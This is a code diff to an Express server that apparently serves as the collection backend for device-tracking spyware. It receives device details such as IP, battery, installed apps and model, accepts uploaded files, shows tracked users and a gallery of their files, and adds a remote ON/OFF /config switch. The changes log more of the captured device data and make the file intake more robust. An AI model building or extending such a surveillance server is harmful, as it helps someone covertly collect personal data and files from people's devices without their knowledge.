@@ -43,6 +43,13 @@ function parseBody(body) {
   return obj;
 }
 
+/* ================= CONFIG CONTROL ================= */
+
+app.get('/config', (req, res) => {
+  // 0 = OFF, 1 = ON
+  res.send("1");
+});
+
 /* ================= TRACK ================= */
 
 app.post('/track', (req, res) => {
@@ -66,9 +73,7 @@ app.post('/track', (req, res) => {
     };
 
     console.log("\n📱 DEVICE =====================");
-    console.log("IP:", data.ip);
-    console.log("Battery:", data.battery);
-    console.log("Apps count:", data.apps.length);
+    console.log(data);
 
     saveLog(data);
 
@@ -82,24 +87,32 @@ app.post('/upload', (req, res) => {
 
   let fileName = Date.now().toString();
 
-  // 👇 extract original name
+  let original = "file.bin";
+
   if (req.query.name) {
-    const original = path.basename(req.query.name);
-    const ext = path.extname(original);
-    fileName += ext || ".bin";
-  } else {
-    fileName += ".bin";
+    try {
+      const decoded = decodeURIComponent(req.query.name);
+      original = path.basename(decoded);
+    } catch {}
   }
 
+  const ext = path.extname(original);
+  fileName += ext || ".bin";
+
   const filePath = path.join(UPLOAD_DIR, fileName);
+
+  console.log("\n📦 FILE RECEIVED =====================");
+  console.log("Query:", req.query);
+  console.log("Saved as:", fileName);
 
   const stream = fs.createWriteStream(filePath);
   req.pipe(stream);
 
-  req.on('end', () => {
+  stream.on('error', () => {
+    console.log("Write error");
+  });
 
-    console.log("\n📦 FILE RECEIVED =====================");
-    console.log("Saved as:", fileName);
+  req.on('end', () => {
 
     saveLog({
       type: "file",
@@ -115,7 +128,7 @@ app.post('/upload', (req, res) => {
   });
 });
 
-/* ================= USERS (ADVANCED VIEW) ================= */
+/* ================= USERS ================= */
 
 app.get('/users', (req, res) => {
 
@@ -129,12 +142,8 @@ app.get('/users', (req, res) => {
   const unique = {};
 
   logs.forEach(log => {
-
     if (!log.ip || !log.model) return;
-
     const key = log.ip + "_" + log.model;
-
-    // latest entry overwrite
     unique[key] = log;
   });
 
@@ -175,6 +184,7 @@ app.get('/users', (req, res) => {
 
   res.send(html);
 });
+
 /* ================= GALLERY ================= */
 
 app.get('/gallery', (req, res) => {
@@ -246,5 +256,5 @@ app.use('/uploads', express.static(UPLOAD_DIR));
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
-  console.log("Server running on port", PORT);
+  console.log("🚀 Server running on port", PORT);
 });
